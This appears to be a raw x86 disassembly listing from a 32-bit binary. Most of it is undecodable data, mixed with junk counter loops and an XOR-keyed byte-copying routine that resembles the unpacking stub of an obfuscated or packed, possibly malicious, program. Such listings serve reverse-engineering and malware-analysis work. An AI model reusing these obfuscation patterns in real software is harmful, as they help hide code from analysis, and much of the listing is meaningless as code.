  402906:	outs   dx,BYTE PTR ds:[esi]
  402907:	xlat   BYTE PTR ds:[ebx]
  402908:	xchg   esp,eax
  402909:	add    eax,0x134a4228
  40290e:	rol    esp,cl
  402910:	dec    ebp
  402911:	cs mov bh,0x2a
  402914:	cmp    ch,BYTE PTR [ecx-0x56afc807]
  40291a:	(bad)  
  40291b:	adc    eax,0xd956475
  402920:	fwait
  402921:	(bad)  
  402922:	or     al,cl
  402924:	fstp   TBYTE PTR [esi]
  402926:	push   0x8fe900f4
  40292b:	and    esp,DWORD PTR [esi]
  40292d:	inc    edi
  40292e:	iret   
  40292f:	test   al,0xd0
  402931:	jmp    0x3437d5be
  402936:	aad    0x7a
  402938:	repnz sar al,0x65
  40293c:	or     al,0x9d
  40293e:	(bad)  [edi]
  402940:	test   al,0xfa
  402942:	ins    BYTE PTR es:[edi],dx
  402943:	dec    edi
  402944:	outs   dx,DWORD PTR ds:[esi]
  402945:	or     DWORD PTR [edi-0xc8211e5],ebp
  40294b:	inc    ebx
  40294c:	xor    eax,0xfff43176
  402951:	mov    ecx,0x747d18b7
  402956:	cld    
  402957:	jno    0x4028dd
  402959:	dec    ecx
  40295a:	cmp    eax,0xe40e698d
  40295f:	sti    
  402960:	xchg   DWORD PTR [ecx+0xd],edi
  402963:	and    esi,DWORD PTR [edx+0x47]
  402966:	dec    eax
  402967:	add    BYTE PTR [ebx],0xb7
  40296a:	mov    DWORD PTR [eax-0x1b0f2656],ebx
  402970:	in     eax,dx
  402971:	leave  
  402972:	mov    ?,esp
  402974:	jbe    0x402939
  402976:	idiv   DWORD PTR [esi]
  402978:	mov    eax,DWORD PTR [edx+0x3c]
  40297b:	or     eax,0xae5b8387
  402980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402981:	add    BYTE PTR [edi-0x4c167f46],dh
  402987:	imul   DWORD PTR [edi-0x40]
  40298a:	xchg   edi,eax
  40298b:	or     eax,0x7037c974
  402990:	xor    ah,BYTE PTR [edx+0x54ff695c]
  402996:	pop    ds
  402997:	test   bh,dl
  402999:	mov    BYTE PTR [eax],0xd2
  40299c:	push   ds
  40299d:	test   eax,0x7b505002
  4029a2:	jno    0x402947
  4029a4:	push   ecx
  4029a5:	pop    edx
  4029a6:	xchg   ebp,eax
  4029a7:	push   ss
  4029a8:	mov    ebx,0xcbda7c7c
  4029ad:	imul   ebp,DWORD PTR [esi+0x23c456f1],0xffffffd7
  4029b4:	(bad)  
  4029b5:	es leave 
  4029b7:	pop    edi
  4029b8:	js     0x4029dc
  4029ba:	ret    0x4005
  4029bd:	sub    eax,0xe5fd82c3
  4029c2:	mov    eax,ds:0xdcfb3fbd
  4029c7:	mov    cl,0xca
  4029c9:	bnd jno 0x4029dd
  4029cc:	jns    0x4029a9
  4029ce:	inc    esi
  4029cf:	or     ebp,DWORD PTR [eax]
  4029d1:	pop    ss
  4029d2:	sbb    bh,0x8e
  4029d5:	std    
  4029d6:	std    
  4029d7:	cs repz es sti 
  4029db:	data16 fld TBYTE PTR [esi]
  4029de:	push   edx
  4029df:	lahf   
  4029e0:	mov    dl,0xf0
  4029e2:	xor    ebx,edx
  4029e4:	bound  edx,QWORD PTR [ecx-0x73]
  4029e7:	test   BYTE PTR [edx],ch
  4029e9:	ins    DWORD PTR es:[edi],dx
  4029ea:	fcomp  QWORD PTR [eax-0x36]
  4029ed:	push   esi
  4029ee:	add    eax,0xb7ae0dac
  4029f3:	mov    bl,0xa2
  4029f5:	jge    0x402a33
  4029f7:	mov    bh,bh
  4029f9:	rol    BYTE PTR [esi+0x5e],1
  4029fc:	xchg   BYTE PTR [esi+0x17fc0846],bh
  402a02:	mov    ah,BYTE PTR ss:[ebx+0x54]
  402a06:	outs   dx,BYTE PTR ds:[esi]
  402a07:	call   0x1dd6:0x7aa5a6f1
  402a0e:	sub    DWORD PTR [ecx-0x40],eax
  402a11:	sub    edi,0x407c7dd2
  402a17:	push   ecx
  402a18:	and    DWORD PTR ds:0x434587,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434587
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434587,edx
  402a34:	cmp    DWORD PTR ds:0x434587,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434587,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4344e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434587,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434587
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434587,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4344ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43453b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434577,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434577
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434577,ecx
  402aac:	cmp    DWORD PTR ds:0x434577,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434577,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43460f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4345fb
  402ae8:	or     DWORD PTR ds:0x4345c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4345b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4345c3,0x434503
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	cmp    bh,dl
  402b21:	das    
  402b22:	js     0x402b97
  402b24:	or     DWORD PTR [esi+0x7e],edi
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b59
  402b2c:	and    al,0xf2
  402b2e:	inc    eax
  402b2f:	neg    BYTE PTR [ebp-0x6d7366af]
  402b35:	and    DWORD PTR [ecx],0x94bcd0b9
  402b3b:	pushf  
  402b3c:	push   edi
  402b3d:	jo     0x402ad0
  402b3f:	and    edi,DWORD PTR [ecx]
  402b41:	pop    esi
  402b42:	sbb    dh,BYTE PTR [ebx+0x5c07e20]
  402b48:	dec    ebx
  402b49:	aaa    
  402b4a:	repz inc esi
  402b4c:	xchg   edi,eax
  402b4d:	push   ebx
  402b4e:	mov    esi,0x704e98b3
  402b53:	pop    es
  402b54:	aad    0x6d
  402b56:	test   DWORD PTR [esi+edi*8+0x7d],eax
  402b5a:	sub    bh,BYTE PTR [ebp+0x7]
  402b5d:	ss mov esi,0xac39d60f
  402b63:	and    esp,DWORD PTR [edx+0xbcc3136]
  402b69:	jmp    0x68b5eabe
  402b6e:	add    BYTE PTR [edi],ah
  402b70:	cdq    
  402b71:	call   0x3274304a
  402b76:	sub    DWORD PTR [edx-0x7cea17f8],edi
  402b7c:	jmp    0x402b48
  402b7e:	and    al,0xe
  402b80:	pop    ss
  402b81:	repnz sub edi,DWORD PTR es:[ebp+edi*8-0x7a]
  402b87:	in     eax,0xc
  402b89:	loopne 0x402b16
  402b8b:	data16 sub al,0x9
  402b8e:	fiadd  WORD PTR [eax+0x51]
  402b91:	adc    al,0x77
  402b93:	push   DWORD PTR [ebx+edx*2+0x56241b86]
  402b9a:	imul   esp,DWORD PTR fs:[edx-0x69197f17],0x55
  402ba2:	rcl    BYTE PTR [ecx],cl
  402ba4:	popf   
  402ba5:	fs pop edi
  402ba7:	pop    edi
  402ba8:	sti    
  402ba9:	mov    edx,0x98a5c9c
  402bae:	add    DWORD PTR [esp+ebp*4],ebx
  402bb1:	xchg   ebx,eax
  402bb2:	dec    ebp
  402bb3:	or     DWORD PTR [ecx],ebp
  402bb5:	xlat   BYTE PTR ds:[ebx]
  402bb6:	int    0xe6
  402bb8:	mov    dl,BYTE PTR [ecx]
  402bba:	div    BYTE PTR [eax-0x6eaf86ae]
  402bc0:	sbb    DWORD PTR [ecx-0x3f],eax
  402bc3:	aad    0x2
  402bc5:	and    eax,esi
  402bc7:	gs and al,0xad
  402bca:	adc    eax,0x22b900dc
  402bcf:	pop    edi
  402bd0:	jecxz  0x402c19
  402bd2:	jecxz  0x402bf6
  402bd4:	leave  
  402bd5:	dec    esp
  402bd6:	mov    al,0xe0
  402bd8:	jl     0x402c0e
  402bda:	gs lock mov bl,0x9f
  402bde:	or     ah,BYTE PTR ds:[ebx+0x3]
  402be2:	int3   
  402be3:	push   edi
  402be4:	and    eax,0x8460b776
  402be9:	and    BYTE PTR [esi+0x160bf524],dl
  402bef:	out    0x9a,al
  402bf1:	mov    ds:0xe90c4318,al
  402bf6:	call   0xed73:0x8267195c
  402bfd:	sub    al,0xd
  402bff:	sahf   
  402c00:	push   ebp
  402c01:	je     0x402c04
  402c03:	and    BYTE PTR [edx+0x23],0x59
  402c07:	(bad)  
  402c09:	mov    cl,0xe9
  402c0b:	add    DWORD PTR [ecx],ecx
  402c0d:	pop    ebp
  402c0e:	fistp  DWORD PTR [edx-0x6461523b]
  402c14:	cmp    eax,0x4c7c0c84
  402c19:	push   0x2e
  402c1b:	mov    ds:0xc9dc7e78,eax
  402c20:	cmp    DWORD PTR [ecx-0x63],0xdae5ea79
  402c27:	stos   BYTE PTR es:[edi],al
  402c28:	dec    edx
  402c29:	ds cdq 
  402c2b:	shl    DWORD PTR [ebp+0x69],cl
  402c2e:	xlat   BYTE PTR gs:[ebx]
  402c30:	and    cl,0x43
  402c33:	mov    al,ds:0xa6755a16
  402c38:	jmp    0x45e0:0xe5883c16
  402c3f:	imul   edx,DWORD PTR [ecx-0x4e],0x52
  402c43:	mov    ch,0x98
  402c45:	mov    edx,0x81cf80
  402c4a:	lsl    edx,si
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434507,0x0
  402c5f:	mov    eax,ds:0x434507
  402c64:	inc    eax
  402c65:	mov    ds:0x434507,eax
  402c6a:	cmp    DWORD PTR ds:0x434507,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434507,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4344e7,0x434613
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	xchg   ebx,eax
  402ce7:	mov    bl,0xb
  402ce9:	mov    al,0x13
  402ceb:	or     edi,DWORD PTR [esi+0x7e]
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402c83
  402cf3:	adc    eax,0x72ec1a74
  402cf8:	pop    DWORD PTR ds:0x2667ab29
  402cfe:	sti    
  402cff:	or     DWORD PTR [ebx+0x690e188c],edi
  402d05:	imul   BYTE PTR [edx+0x64]
  402d08:	adc    ebx,edi
  402d0a:	test   DWORD PTR [ebx],esi
  402d0c:	imul   dx,WORD PTR cs:[ebp+0x5b676f25],0x76
  402d15:	in     al,0xb6
  402d17:	jg     0x402d13
  402d19:	inc    edx
  402d1a:	or     DWORD PTR [ecx],ebx
  402d1c:	stos   DWORD PTR es:[edi],eax
  402d1d:	hlt    
  402d1e:	sbb    DWORD PTR [ecx],0x9b49db4f
  402d24:	loop   0x402d3b
  402d26:	mov    eax,DWORD PTR [edi-0x52083b6e]
  402d2c:	sub    ecx,eax
  402d2e:	jo     0x402d27
  402d30:	loope  0x402cb6
  402d32:	(bad)  
  402d33:	fisttp QWORD PTR [ebx+0x34]
  402d36:	jbe    0x402d00
  402d38:	pop    ebp
  402d39:	inc    eax
  402d3a:	mov    DWORD PTR [ebx-0x56],ebx
  402d3d:	je     0x402d81
  402d3f:	mov    cl,0x64
  402d41:	fsubr  DWORD PTR [edi]
  402d43:	retf   0xa356
  402d46:	sub    DWORD PTR [ebp+0x3a],0xfffffff0
  402d4a:	jg     0x402ce6
  402d4c:	cwde   
  402d4d:	fcmovnb st,st(3)
  402d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d50:	push   edx
  402d52:	push   edx
  402d53:	pop    ss
  402d54:	shl    BYTE PTR [eax-0x5850417a],1
  402d5a:	mov    dh,0x75
  402d5c:	repz popa 
  402d5e:	xchg   BYTE PTR [ebp+0x20],dl
  402d61:	xchg   ebp,eax
  402d62:	sbb    eax,esp
  402d64:	mov    fs,edx
  402d66:	or     DWORD PTR [ecx],esi
  402d68:	lods   al,BYTE PTR ds:[esi]
  402d69:	pop    esp
  402d6a:	sub    esi,DWORD PTR [ebx]
  402d6c:	or     ecx,DWORD PTR [edx]
  402d6e:	jle    0x402d04
  402d70:	inc    edi
  402d71:	sub    BYTE PTR ds:0xb3558872,al
  402d77:	cmp    esi,DWORD PTR [esi+ebx*1]
  402d7a:	jp     0x402d04
  402d7c:	or     ecx,ebx
  402d7e:	scas   eax,DWORD PTR es:[edi]
  402d7f:	mov    dl,0x82
  402d81:	cmp    al,0x6b
  402d83:	(bad)  
  402d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d86:	sub    DWORD PTR [esi+esi*1+0x5e],0xb41a2c4a
  402d8e:	mov    ecx,0xd25bd130
  402d93:	cmp    DWORD PTR [edx+0x80912c5],esi
  402d99:	rol    BYTE PTR [ebx+0x2a],0x22
  402d9d:	dec    ebp
  402d9e:	sub    bl,bl
  402da0:	rcr    BYTE PTR [edx-0x374f0249],1
  402da6:	rcl    DWORD PTR [ebp-0x650541b0],cl
  402dac:	fnstcw WORD PTR [ebx]
  402dae:	sub    bl,BYTE PTR ds:0x49ab9d06
  402db4:	push   es
  402db5:	inc    ecx
  402db6:	(bad)  
  402db7:	test   ebp,0xe10842e
  402dbd:	mov    edi,0xb5551eaa
  402dc2:	inc    esp
  402dc3:	loopne 0x402e43
  402dc5:	sbb    al,0x65
  402dc7:	sub    dh,BYTE PTR [ecx-0x20]
  402dca:	cld    
  402dcb:	in     al,0x73
  402dcd:	mov    al,0xd1
  402dcf:	dec    eax
  402dd0:	or     edi,DWORD PTR [edx+0x65]
  402dd3:	movzx  edi,BYTE PTR [edi-0x6157e43f]
  402dda:	shl    BYTE PTR [ebx+eax*4+0x6b],0xba
  402ddf:	cli    
  402de0:	imul   ebx,DWORD PTR ds:0xcce1387e,0x6582051d
  402dea:	dec    edx
  402deb:	adc    al,BYTE PTR [ecx+0x1cee86b4]
  402df1:	dec    ebp
  402df2:	mov    ch,0x78
  402df4:	jl     0x402dee
  402df6:	cmp    BYTE PTR [esi+0x10],0x12
  402dfa:	add    al,0x20
  402dfc:	mov    al,0x32
  402dfe:	or     al,0x6d
  402e00:	push   cs
  402e01:	dec    esp
  402e02:	dec    ebx
  402e03:	fcomp  QWORD PTR ds:0x49cb714f
  402e09:	push   eax
  402e0a:	cs out dx,eax
  402e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e0d:	popf   
  402e0e:	add    DWORD PTR [esi+0x78],0xfffffff5
  402e12:	mov    ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434577,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    bl,BYTE PTR [edx+0x33b8a5f8]
  402e97:	adc    al,0x7e
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e7f
  402e9f:	pop    ecx
  402ea0:	push   ecx
  402ea1:	jns    0x402eac
  402ea3:	and    al,0xd
  402ea5:	sub    esp,ebx
  402ea7:	mov    dh,0xd3
  402ea9:	inc    BYTE PTR [ebx+0x75]
  402eac:	mov    edi,0xe30fe5fd
  402eb1:	cmp    al,0x87
  402eb3:	cli    
  402eb4:	(bad)  
  402eb5:	stc    
  402eb6:	mov    ebp,0x453f4496
  402ebb:	sahf   
  402ebc:	in     eax,0x7
  402ebe:	mov    edx,esi
  402ec0:	imul   esp,DWORD PTR [ecx],0x4a9754f0
  402ec6:	push   ss
  402ec7:	xor    ch,ah
  402ec9:	and    ch,BYTE PTR [esi-0x77]
  402ecc:	js     0x402ed9
  402ece:	sub    BYTE PTR [ebp-0x1f7794e8],0xe7
  402ed5:	outs   dx,DWORD PTR ds:[esi]
  402ed6:	js     0x402eb8
  402ed8:	inc    edx
  402ed9:	sub    al,0xee
  402edb:	repnz sub al,0x5a
  402ede:	mov    edi,0x28d94459
  402ee3:	not    DWORD PTR [esi+0x3b]
  402ee6:	bound  ebp,QWORD PTR [edx]
  402ee8:	stc    
  402ee9:	mov    al,0x4
  402eeb:	push   edx
  402eec:	and    ah,dh
  402eee:	mov    bh,0x94
  402ef0:	pop    eax
  402ef1:	or     esi,DWORD PTR [eax-0x74]
  402ef4:	inc    esp
  402ef5:	aam    0xa4
  402ef7:	sub    al,0xf0
  402ef9:	add    dh,BYTE PTR [edi]
  402efb:	push   ss
  402efc:	xor    eax,0x409dc2d4
  402f01:	call   0x1b4b7290
  402f06:	mov    ch,0x39
  402f08:	sbb    eax,DWORD PTR [esi+0x63977367]
  402f0e:	sbb    eax,0x7ffffdd6
  402f13:	adc    al,al
  402f15:	out    0x9f,eax
  402f17:	inc    ecx
  402f18:	hlt    
  402f19:	(bad)  [edx+0x553f035b]
  402f1f:	cmp    al,0x1c
  402f21:	test   BYTE PTR [ecx],al
  402f23:	cmp    eax,0xd8952802
  402f28:	fisubr WORD PTR [edi+0x3b]
  402f2b:	xchg   edx,eax
  402f2c:	cli    
  402f2d:	dec    ebp
  402f2e:	and    ebp,DWORD PTR [eax-0x21]
  402f31:	xor    DWORD PTR [ebp-0x2e],ebx
  402f34:	jo     0x402ec0
  402f36:	fcmovnu st,st(1)
  402f38:	ss retf 0x125c
  402f3c:	sbb    cl,BYTE PTR [eax-0xd9641e1]
  402f42:	outs   dx,DWORD PTR ds:[esi]
  402f43:	test   BYTE PTR [ebx+0x4e],bl
  402f46:	pop    edx
  402f47:	pop    ds
  402f48:	call   edx
  402f4a:	iret   
  402f4b:	fnstenv [ebx]
  402f4d:	jl     0x402f0d
  402f4f:	mov    esi,0xbf3393e1
  402f54:	ficomp WORD PTR [edi]
  402f56:	xchg   ecx,eax
  402f57:	gs mov ah,0x3d
  402f5a:	pop    es
  402f5b:	mov    ebp,0x8128576e
  402f60:	mov    ds,WORD PTR [esi-0x44]
  402f63:	ins    BYTE PTR es:[edi],dx
  402f64:	outs   dx,BYTE PTR es:[esi]
  402f66:	(bad)  
  402f67:	(bad)  
  402f68:	cmp    esp,eax
  402f6a:	sub    ch,BYTE PTR [ecx+0x2d86c4c6]
  402f70:	xchg   ebx,eax
  402f71:	xor    esi,ebp
  402f73:	or     al,0x30
  402f75:	pop    edi
  402f76:	cwd    
  402f78:	cdq    
  402f79:	jmp    0x990b:0x50d8506f
  402f80:	iret   
  402f81:	mov    bh,0x8b
  402f83:	(bad)  
  402f84:	fnstsw WORD PTR [ebx]
  402f86:	dec    esp
  402f87:	dec    eax
  402f88:	(bad)  
  402f89:	mov    esi,0xbf113a55
  402f8e:	xchg   BYTE PTR [edi-0x7c672186],ch
  402f94:	lods   al,BYTE PTR ds:[esi]
  402f95:	push   ebp
  402f96:	jnp    0x402fd6
  402f98:	jno    0x402ff3
  402f9a:	(bad)  
  402f9b:	outs   dx,DWORD PTR ds:[esi]
  402f9c:	jp     0x402fcd
  402f9e:	faddp  st(6),st
  402fa0:	inc    eax
  402fa1:	pop    ebx
  402fa2:	mov    al,ds:0x3610e954
  402fa7:	mov    cl,0xf9
  402fa9:	inc    esi
  402faa:	push   ds
  402fab:	and    eax,0x11b6a3e8
  402fb0:	xchg   ebp,eax
  402fb1:	dec    ecx
  402fb2:	enter  0x6551,0x5b
  402fb6:	dec    ebp
  402fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fb8:	retf   
  402fb9:	aas    
  402fba:	or     eax,ebx
  402fbc:	dec    ebp
  402fbd:	push   esp
  402fbe:	mov    ecx,0x754cacc1
  402fc3:	mov    dh,0x5b
  402fc5:	aam    0x9b
  402fc7:	(bad)
  402fcb:	sbb    al,BYTE PTR [ebx]
  402fcd:	aas    
  402fce:	dec    ecx
  402fcf:	repz data16 je 0x403024
  402fd3:	sbb    al,0xb5
  402fd5:	mov    ds:0xe9786bff,eax
  402fda:	punpcklwd mm7,mm1
  402fdd:	test   BYTE PTR [ebp-0xd],ch
  402fe0:	(bad)
  402fe4:	sub    DWORD PTR [esi-0x3a826741],0xffffffd0
  402feb:	jb     0x403011
  402fed:	jnp    0x402f7a
  402fef:	and    dl,BYTE PTR [eax-0x93b3442]
  402ff5:	sti    
  402ff6:	stos   DWORD PTR es:[edi],eax
  402ff7:	mov    BYTE PTR [eax],bl
  402ff9:	imul   edx,DWORD PTR [ebp+0x7b],0xa2ccd05b
  403000:	xchg   DWORD PTR [eax],ebp
  403002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403003:	mov    bl,0xc8
  403005:	xor    eax,0xcdc3a36f
  40300a:	test   DWORD PTR [eax+0x7151bb8c],edx
  403010:	loope  0x403009
  403012:	lock xchg ebp,eax
  403014:	stc    
  403015:	inc    ecx
  403016:	pop    ebp
  403017:	dec    edx
  403018:	jbe    0x402fd6
  40301a:	mov    si,0x9c90
  40301e:	scas   eax,DWORD PTR es:[edi]
  40301f:	inc    esi
  403020:	clc    
  403021:	popf   
  403022:	test   ah,ch
  403024:	push   ss
  403025:	std    
  403026:	xchg   ebp,eax
  403027:	retf   
  403028:	mov    ecx,0xcd0f4846
  40302d:	xor    esp,DWORD PTR [esi]
  40302f:	inc    edx
  403030:	mov    edx,0xc7abc1be
  403035:	jb     0x403071
  403037:	xor    al,0x26
  403039:	enter  0x1693,0x6e
  40303d:	jb     0x4030bc
  40303f:	ds cs add ebp,0x11
  403044:	inc    eax
  403045:	sbb    DWORD PTR [ecx-0x29d23cd3],ebp
  40304b:	push   ebp
  40304c:	es aad 0x69
  40304f:	pop    ds
  403050:	lock jo 0x4030a7
  403053:	push   es
  403054:	mov    esi,0x51357e9
  403059:	hlt    
  40305a:	xchg   edx,eax
  40305b:	lea    ebp,[edi-0x5b]
  40305e:	out    0xd4,eax
  403060:	xchg   ebx,eax
  403061:	lock jecxz 0x403051
  403064:	rol    BYTE PTR [eax-0x45],1
  403067:	std    
  403068:	cmc    
  403069:	out    dx,eax
  40306a:	test   BYTE PTR ds:0x3376cc14,ch
  403070:	(bad)  
  403071:	jmp    0x2e81:0xb27f4d34
  403078:	dec    eax
  403079:	pop    esi
  40307a:	lds    edi,FWORD PTR fs:[ebx]
  40307d:	pop    esi
  40307e:	js     0x403049
  403080:	call   DWORD PTR [ecx+0x27]
  403083:	je     0x403094
  403085:	mov    edi,DWORD PTR [ebp+0x76]
  403088:	scas   al,BYTE PTR es:[edi]
  403089:	ret    0x819
  40308c:	out    0x21,al
  40308e:	mov    ebp,0x7b5a1be4
  403093:	add    DWORD PTR [esp+esi*4+0x479fc388],esp
  40309a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40309b:	jae    0x4030bc
  40309d:	pop    ecx
  40309e:	cwde   
  40309f:	pop    esp
  4030a0:	and    eax,0x3e8ed060
  4030a5:	add    ch,dh
  4030a7:	mov    dl,0x2d
  4030a9:	out    0x15,al
  4030ab:	mov    edx,0x6bc720e2
  4030b0:	mov    DWORD PTR [eax-0xe],edi
  4030b3:	jg     0x40310f
  4030b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b6:	and    dh,al
  4030b8:	rcl    BYTE PTR [ebx-0x45e5ebae],0xda
  4030bf:	sar    ch,cl
  4030c1:	inc    ebx
  4030c2:	mov    esp,0x3c4d21a8
  4030c7:	test   DWORD PTR [edi+0x3ac699f3],ecx
  4030cd:	ror    DWORD PTR [ebx],0x7b
  4030d0:	mov    edi,0x6ef47aaf
  4030d5:	cmp    DWORD PTR [eax+0x1e],0xffffffd3
  4030d9:	push   0x6333a61e
  4030de:	ds out dx,al
  4030e0:	sar    BYTE PTR [ecx+ecx*8],1
  4030e3:	loop   0x4030de
  4030e5:	out    0x59,eax
  4030e7:	mov    edi,0xbd093363
  4030ec:	mov    dl,0xae
  4030ee:	test   dl,0x5d
  4030f1:	int3   
  4030f2:	jb     0x403108
  4030f4:	fist   WORD PTR [ecx]
  4030f6:	jmp    0xab396027
  4030fb:	pushf  
  4030fc:	mov    ebp,DWORD PTR [ebx]
  4030fe:	cmp    ecx,DWORD PTR [ebp-0xd]
  403101:	stos   DWORD PTR es:[edi],eax
  403102:	pop    ss
  403103:	lds    ecx,FWORD PTR [ebp+0x2f]
  403106:	fidivr WORD PTR [edx-0x74]
  403109:	(bad)  
  40310a:	jno    0x4030a0
  40310c:	xor    ecx,esi
  40310e:	dec    ecx
  40310f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403110:	dec    ebx
  403111:	imul   BYTE PTR [edx+0x6b108739]
  403117:	cli    
  403118:	(bad)  
  403119:	xlat   BYTE PTR ds:[ebx]
  40311a:	iret   
  40311b:	stos   DWORD PTR es:[edi],eax
  40311c:	cmp    eax,0xdec24121
  403121:	or     DWORD PTR ds:0x9b72b218,0x226bce48
  40312b:	fiadd  DWORD PTR [edi-0x78b01d06]
  403131:	rcr    BYTE PTR [edi-0x8b2c892],cl
  403137:	mov    edi,0x8809686f
  40313c:	test   BYTE PTR [eax*2+0x303cf21c],dl
  403143:	push   0xa7a0f224
  403148:	push   esi
  403149:	mov    ax,0xc61b
  40314d:	jb     0x403178
  40314f:	dec    esp
  403150:	and    ecx,DWORD PTR [ecx-0x1d310546]
  403156:	fdivrp st(7),st
  403158:	push   ebp
  403159:	add    DWORD PTR [edi+eiz*4],ecx
  40315c:	pop    ebx
  40315d:	mov    al,ds:0x42ef936f
  403162:	sbb    ah,BYTE PTR [edi]
  403164:	xchg   DWORD PTR [ebp+0xaf6f614],ecx
  40316a:	shr    BYTE PTR [esi-0xe62ebc0],0x67
  403171:	div    BYTE PTR [edi+0x72]
  403174:	cmp    ah,ch
  403176:	test   eax,0xa23e75e2
  40317b:	jle    0x40315d
  40317d:	xchg   ebx,eax
  40317e:	xchg   esi,eax
  40317f:	retf   
  403180:	push   cs
  403181:	pop    edx
  403182:	lods   eax,DWORD PTR ds:[esi]
  403183:	pop    esp
  403184:	loop   0x403185
  403186:	and    DWORD PTR [edi+0x5dee6253],edx
  40318c:	pop    ecx
  40318d:	fimul  DWORD PTR [edi]
  40318f:	aaa    
  403190:	sbb    ah,BYTE PTR [eax+0x79]
  403193:	test   BYTE PTR [ecx],bl
  403195:	pop    esi
